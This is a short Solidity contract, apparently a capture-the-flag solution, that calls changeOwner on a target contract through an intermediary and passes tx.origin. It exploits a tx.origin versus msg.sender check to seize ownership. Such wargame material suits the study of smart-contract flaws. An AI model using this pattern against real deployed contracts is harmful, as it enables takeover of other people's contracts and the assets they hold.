// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneOwner {
    address tel;

    constructor(address _tel) {
        tel = _tel;
    }

    function own() public {
        (bool success,) = tel.call(abi.encodeWithSignature("changeOwner(address)", tx.origin));
        require(success, "Could not call changeOwner");
    }
}
